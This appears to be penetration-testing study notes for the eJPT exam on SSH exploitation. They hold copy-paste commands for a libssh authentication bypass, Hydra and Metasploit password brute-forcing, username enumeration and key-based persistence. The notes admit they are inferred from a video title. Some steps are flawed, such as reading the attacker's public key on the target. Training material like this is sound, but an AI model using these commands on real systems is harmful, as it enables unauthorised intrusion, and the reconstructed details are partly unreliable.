# Exploiting a Vulnerable SSH Server (eJPT) — Study Notes

Note: No transcript was provided. The following is inferred conservatively from the video title and typical eJPT Linux exploitation workflows. Where specific CVEs/modules are mentioned (e.g., libssh auth bypass), they are common examples used in labs to demonstrate “exploiting a vulnerable SSH server.”

## What the video covers (Introduction / big picture)
- How to enumerate and fingerprint an SSH service on a Linux target.
- How to identify server implementations and versions (OpenSSH vs libssh).
- How to exploit a vulnerable SSH server:
  - Authentication bypass on libssh (CVE-2018-10933) when applicable.
  - Weak/default password attacks when authentication is enabled.
- How to log in via SSH and perform basic post-exploitation checks.

## Flow (ordered)
1. Discover SSH (port 22/tcp) and fingerprint version.
2. Run SSH-focused enumeration scripts (algorithms, hostkeys, auth methods).
3. Inspect the banner to determine implementation:
   - If it shows libssh (and a vulnerable version), attempt auth bypass.
   - If it’s OpenSSH or not vulnerable, proceed with credential attacks.
4. Optional: Enumerate valid usernames to narrow the brute-force scope.
5. Attempt credential attacks with a throttled wordlist (Hydra/MSF).
6. Log in with discovered credentials or via successful bypass.
7. Post-exploitation quick checks (id, sudo -l, uname -a).
8. Maintain access (optional): add SSH keys or leverage existing ones.
9. Document findings and clean up.

## Tools highlighted
- Nmap (version detection and SSH NSE scripts)
- Netcat or ssh client (banner grabbing)
- Metasploit Framework (ssh_enumusers, ssh_login, libssh auth bypass)
- Hydra (SSH password attacks)
- searchsploit (locate public PoCs)
- ssh/sshpass/scp (access and file transfer)

## Typical command walkthrough (detailed, copy-paste friendly)

Set a target helper variable:
```bash
IP=10.10.10.10
PORT=22
```

1) Fast enumeration and fingerprinting
```bash
# Quick service/version check
nmap -p$PORT -sV -sC -oN scans/${IP}-ssh_quick.nmap $IP

# Deeper SSH-specific enumeration
nmap -p$PORT --script "ssh2-enum-algos,ssh-hostkey,ssh-auth-methods" \
  -oN scans/${IP}-ssh_nse.nmap $IP

# Grab the server banner
nc -nv $IP $PORT
# or force minimal auth to see methods
ssh -vvv -o PreferredAuthentications=none -o PubkeyAuthentication=no -p $PORT $IP
```

2) Decide exploitation path based on banner
- If the banner looks like “SSH-2.0-libssh_0.8.x” or “SSH-2.0-libssh_0.7.x” (known vulnerable ranges for CVE-2018-10933), try the libssh authentication bypass.
- If you see “OpenSSH_X.Y” (typical on Linux), prepare for credential attacks or other misconfig-based exploitation.

3A) Option A — libssh authentication bypass (CVE-2018-10933)
Metasploit approach:
```bash
msfconsole -q
search libssh
# Prefer an exploit module if present; otherwise a scanner + exploit chain
use exploit/multi/ssh/libssh_auth_bypass
set RHOSTS $IP
set RPORT $PORT
set TARGET 0
# Often a simple Unix command payload or interactive shell is supported
set PAYLOAD cmd/unix/interact
run
```

PoC approach via Exploit-DB (IDs may vary; adapt to the PoC you pull):
```bash
# Find a matching PoC
searchsploit libssh 0.8
# Example: copy the PoC to current directory (replace 46307 with the actual ID)
searchsploit -m 46307
# Run the PoC (syntax varies by PoC, commonly: host port 'command')
python3 46307.py $IP $PORT 'id'
```

If successful, you’ll get command execution or an authenticated session without valid credentials.

3B) Option B — Username enumeration (optional but helpful)
Metasploit:
```bash
msfconsole -q
use auxiliary/scanner/ssh/ssh_enumusers
set RHOSTS $IP
set USER_FILE users.txt   # supply candidate users
run
```
Note: Some SSH servers leak valid vs invalid user behaviors (e.g., CVE-2018-15473 on certain OpenSSH versions). Use this to refine brute-force lists.

4) Credential attacks with Hydra (throttled)
Prepare wordlist:
```bash
# Ensure rockyou exists (Kali)
[ -f /usr/share/wordlists/rockyou.txt ] || gzip -d /usr/share/wordlists/rockyou.txt.gz
```

Hydra single user:
```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt -s $PORT -f -V $IP ssh
```

Hydra multiple users:
```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -s $PORT -f -V -u $IP ssh
```
Tips:
- Use -t 4 (or similar) to throttle if the target is fragile.
- -f stops after the first valid credential is found.
- -u loops users first; useful with large lists.

Metasploit alternative (ssh_login):
```bash
msfconsole -q
use auxiliary/scanner/ssh/ssh_login
set RHOSTS $IP
set RPORT $PORT
set USER_FILE users.txt      # or: set USERNAME user1
set PASS_FILE /usr/share/wordlists/rockyou.txt
set STOP_ON_SUCCESS true
set VERBOSE true
run
```

5) Log in via SSH and stabilize
```bash
# Direct SSH
ssh -p $PORT user@$IP

# Non-interactive automation (accept host key automatically)
ssh -p $PORT -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null user@$IP

# If you know the password and want to script it:
sshpass -p 'PASSWORD' ssh -p $PORT -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null user@$IP
```

6) Post-exploitation quick checks
```bash
id; whoami; hostname; uname -a
cat /etc/os-release 2>/dev/null || cat /etc/issue
ip a || ifconfig
sudo -l
```

7) Maintain access (optional, if you have a password)
```bash
# On attacker, create a key
ssh-keygen -t ed25519 -f ~/.ssh/ed25519-ep -N ""

# On target (as the compromised user), ensure ~/.ssh exists and add your pubkey
mkdir -p ~/.ssh && chmod 700 ~/.ssh
echo "$(cat ~/.ssh/ed25519-ep.pub)" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# Login with key
ssh -i ~/.ssh/ed25519-ep -p $PORT user@$IP
```

## Practical tips
- libssh vs OpenSSH:
  - If the banner contains libssh_X.Y, consider CVE-2018-10933 (0.7.0–0.7.5 and 0.8.0–0.8.3). libssh2 is different and not affected by that CVE.
  - OpenSSH banners look like OpenSSH_7.2p2 Ubuntu-... (not affected by libssh auth bypass).
- Safe brute-forcing:
  - Throttle attempts (e.g., Hydra -t 4, or MSF’s MaxSessions) to avoid lockouts or DoS.
  - Enumerate valid users first when possible to cut noise and time.
- Check auth methods:
  - Use nmap’s ssh-auth-methods NSE or ssh -o PreferredAuthentications=none to see whether password, publickey, or keyboard-interactive are enabled.
- Misconfig clues:
  - If PasswordAuthentication yes and PermitRootLogin yes, try root with a small, targeted list first (defaults, device/vendor creds).
- Avoid prompts during automation:
  - Use -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null with ssh to avoid host key prompts.
- Evidence and cleanup:
  - Save nmap outputs; note exact banners and versions.
  - If you added keys, remove them in clean labs after testing.

## Minimal cheat sheet (one-screen flow)
```bash
IP=10.10.10.10; PORT=22

# 1) Enum
nmap -p$PORT -sV -sC $IP
nmap -p$PORT --script "ssh2-enum-algos,ssh-hostkey,ssh-auth-methods" $IP
nc -nv $IP $PORT

# 2) If libssh banner & vulnerable version => try bypass (MSF or PoC)
msfconsole -q -x "search libssh; use exploit/multi/ssh/libssh_auth_bypass; set RHOSTS $IP; set RPORT $PORT; run"

# 3) Else enumerate users (optional) and brute-force
msfconsole -q -x "use auxiliary/scanner/ssh/ssh_enumusers; set RHOSTS $IP; set USER_FILE users.txt; run; exit"
[ -f /usr/share/wordlists/rockyou.txt ] || gzip -d /usr/share/wordlists/rockyou.txt.gz
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -s $PORT -f -V -u $IP ssh

# 4) Login and quick post-exp
ssh -p $PORT -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null user@$IP
id; sudo -l; uname -a
```

## Summary
- Identify the SSH service and its implementation with Nmap and banner grabs.
- If it’s libssh within a known vulnerable range, attempt the CVE-2018-10933 authentication bypass (Metasploit or PoC).
- If it’s OpenSSH or not vulnerable, proceed with a controlled credential attack, ideally after enumerating valid users to reduce noise.
- Upon gaining access, perform immediate post-exploitation checks and optionally add an SSH key for persistence in lab settings.
- Document exact versions, banners, and steps taken.